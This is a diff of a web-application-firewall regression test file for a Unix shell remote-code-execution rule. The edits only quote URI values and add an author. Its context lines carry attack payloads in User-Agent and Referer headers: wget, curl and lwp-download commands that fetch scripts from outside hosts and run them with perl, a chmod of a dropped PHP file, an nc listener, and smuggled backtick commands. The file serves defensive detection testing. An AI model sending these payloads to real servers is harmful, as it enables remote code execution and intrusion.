@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Franziska Bühler, Max Leske, Esad Cetiner, Xhoenix"
+  author: "Franziska Bühler, Max Leske, Esad Cetiner, Xhoenix, azurit"
   description: |
     Unix shell RCE
       - with / without prefix
@@ -21,7 +21,7 @@ tests:
               User-Agent: ";chmod +x evil.php"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -37,7 +37,7 @@ tests:
               User-Agent: ";CHMOD +X EVIL.PHP"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -57,7 +57,7 @@ tests:
               User-Agent: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -77,7 +77,7 @@ tests:
               User-Agent: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -96,7 +96,7 @@ tests:
               Content-Type: application/x-www-form-urlencoded
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.1
           output:
             no_log_contains: id "932239"
@@ -117,7 +117,7 @@ tests:
               Referer: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -138,7 +138,7 @@ tests:
               Referer: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -158,7 +158,7 @@ tests:
               Content-Type: application/x-www-form-urlencoded
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.1
           output:
             no_log_contains: id "932239"
@@ -174,7 +174,7 @@ tests:
               User-Agent: ;cp /var/log/apache2/error.log evil.php
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -334,7 +334,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -351,7 +351,7 @@ tests:
               Referer: a=nc&&$a -nlvp 555
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -367,7 +367,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -383,7 +383,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -399,7 +399,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -416,7 +416,7 @@ tests:
               Referer: "https://example.com/?args=environment"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -432,7 +432,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -449,7 +449,7 @@ tests:
               Referer: "https://example.com/?args=performance"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.0
           output:
             no_log_contains: id "932239"
@@ -465,7 +465,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -482,7 +482,7 @@ tests:
               referer: "https://example.com/?args=env --version"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -498,7 +498,7 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -515,7 +515,7 @@ tests:
               referer: "https://example.com/?args=perf --version"
             method: GET
             port: 80
-            uri: /get
+            uri: "/get"
             version: HTTP/1.1
           output:
             log_contains: id "932239"
@@ -531,7 +531,7 @@ tests:
               User-Agent: ";`cat<<<ifconfig`"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -547,7 +547,7 @@ tests:
               User-Agent: ";`cat<<< ifconfig`"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -563,7 +563,7 @@ tests:
               User-Agent: ";`cat<<<'ifconfig'`"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -579,7 +579,7 @@ tests:
               User-Agent: ';`cat<<<"ifconfig"`'
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -595,7 +595,7 @@ tests:
               User-Agent: ";`cat<<<$(ifconfig)`"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -611,7 +611,7 @@ tests:
               User-Agent: "time ifconfig"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -627,7 +627,7 @@ tests:
               User-Agent: "strace ifconfig"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -643,7 +643,7 @@ tests:
               User-Agent: "nohup ifconfig"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -659,7 +659,7 @@ tests:
               User-Agent: "ansible all -m ping"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -675,7 +675,7 @@ tests:
               User-Agent: "ansible-config dump"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -691,7 +691,7 @@ tests:
               User-Agent: "ansible-galaxy collection install community.general"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -707,7 +707,7 @@ tests:
               User-Agent: "code=ansible-console"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -723,7 +723,7 @@ tests:
               User-Agent: "ansible-doc plugin ping"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -739,7 +739,7 @@ tests:
               User-Agent: "ansible-inventory --list"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -755,7 +755,7 @@ tests:
               User-Agent: "ansible-pull --url example.com"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -771,7 +771,7 @@ tests:
               User-Agent: "ansible-vault decrypt secret"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -787,7 +787,7 @@ tests:
               User-Agent: "ansible-playbook site.yml"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -803,7 +803,7 @@ tests:
               User-Agent: "chef-vault -i secret"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -819,7 +819,7 @@ tests:
               User-Agent: "chef-shell"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -835,7 +835,7 @@ tests:
               User-Agent: "chef-run all recipie.rb"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -851,7 +851,7 @@ tests:
               User-Agent: "chef-client -t 1.1.1.1"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -867,7 +867,7 @@ tests:
               User-Agent: "chef report nodes"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -883,7 +883,7 @@ tests:
               User-Agent: "visudo"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
@@ -899,7 +899,7 @@ tests:
               User-Agent: "cscli alerts list"
             method: POST
             port: 80
-            uri: /post
+            uri: "/post"
             version: HTTP/1.0
           output:
             log_contains: id "932239"
